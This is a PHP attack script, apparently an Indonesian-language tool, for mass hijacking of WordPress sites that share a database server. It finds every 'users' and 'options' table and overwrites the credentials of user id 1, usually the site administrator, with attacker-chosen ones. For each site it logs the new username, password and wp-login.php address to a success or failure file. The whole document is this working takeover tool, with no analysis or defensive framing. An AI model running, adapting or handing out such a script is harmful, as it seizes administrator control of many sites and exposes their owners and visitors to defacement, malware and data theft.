<?php
error_reporting(E_ALL ^ E_NOTICE);
include 'config.php';

function save($filename, $data){
        $handle = fopen($filename, "a+");
        fwrite($handle, "$data\n");
        fclose($handle);
}
function checkURL($row){
	include 'config.php';

	$res = $db->prepare('SELECT * FROM '.$row.' WHERE option_id=1');
	$urllogin = $res->execute();

	if ($urllogin == true) {
		$urlquery = 'SELECT * FROM '.$row.' WHERE option_id=1';
		$urlLogin = $db->query($urlquery)->fetch();

		$login = $urlLogin['option_value']."/wp-login.php";

		return $login;
	} else {
		$res = $db->prepare('SELECT * FROM '.$row.' WHERE option_id=2');
		$urllogin = $res->execute();

		if ($urllogin == true) {
			$urlquery = 'SELECT * FROM '.$row.' WHERE option_id=2';
			$urlLogin = $db->query($urlquery)->fetch();

			$login = $urlLogin['option_value']."/wp-login.php";

			return $login;
		} else {
			$msg = 'Gagal Ambil Domain';
			return $msg;
		}
	}
}

	$list = array();
	$listurl = array();
	$res = $db->query('SHOW TABLES LIKE "%users%"');
	$view = $db->query('SHOW TABLES LIKE "%options%"');
	while ($urlrow = $view->fetch(PDO::FETCH_NUM)) {
		$listurl[] = $urlrow[0];
	}
	while ($row = $res->fetch(PDO::FETCH_NUM)) {
		$list[] = $row[0];
	}
	$count = count($list);

	echo "\n\nTotal tables = ".$count."\n\n";
	echo "Prepair...\n\n";

	sleep(2);

	$line = 0;
	for ($i=0; $i < $count; $i++) {
		$tables = $list[$i];
		$urlrows = $listurl[$i];

		$line = $line + 1;
		
		
		$edit = $db->prepare($editQuery);
		$data = array(
			':username' => $username,
			':password' => $password,
			':id' => 1
		);
		$loginURL = checkURL($urlrows);
		// $loginURL = $urllogin['option_value'] == NULL ? 'Gagal Get Domain' : $urllogin['option_value'];
		if($edit->execute($data)){
			echo "[".$line."] [SUKSES EDIT USER] ".$tables." | ".$username.":".$password." [ ".$urlrows." => UrlLogin:\"".$loginURL."\" ]\n";
			$isi = $tables." | ".$username.":".$password." [ ".$urlrows." => UrlLogin:\"".$loginURL."\" ]";
			save('sukses-edit.txt', $isi);
		} else {
			echo "[".$line."] [ Goo ] $tables  $username=OK=$password \n";
			$isi = $tables." | ".$username.":".$password." [ ".$urlrows." => UrlLogin:\"".$loginURL."\" ]";
			save('failed-edit.txt', $isi);
		}
	}
